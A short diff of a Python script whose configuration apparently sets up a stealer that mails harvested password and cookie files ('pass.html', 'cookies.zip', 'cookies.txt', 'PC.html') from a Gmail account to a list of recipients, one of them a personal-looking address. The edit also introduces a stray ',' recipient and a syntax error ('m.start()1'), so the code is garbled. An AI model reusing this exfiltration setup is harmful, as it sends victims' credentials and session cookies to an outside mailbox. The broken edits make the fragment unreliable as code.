@@ -14,7 +14,7 @@ class Main:
     def __init__(self):
         self.source_mail = 'YOUR_EMAIL@gmail.com'
         self.source_pass = 'YOUR_PASSWORD'
-        self.dest_mail = ['kovinevmv@gmail.com', 'YOUR_EMAIL@gmail.com', 'ANOTHER_EMAIL@gmail.com']
+        self.dest_mail = ['kovinevmv@gmail.com', ',']
 
         self.files = ['pass.html', 'PC.html', 'cookies.zip', 'cookies.txt']
 
@@ -66,4 +66,4 @@ class Main:
 
 if __name__ == '__main__':
     m = Main()
-    m.start()
+    m.start()1
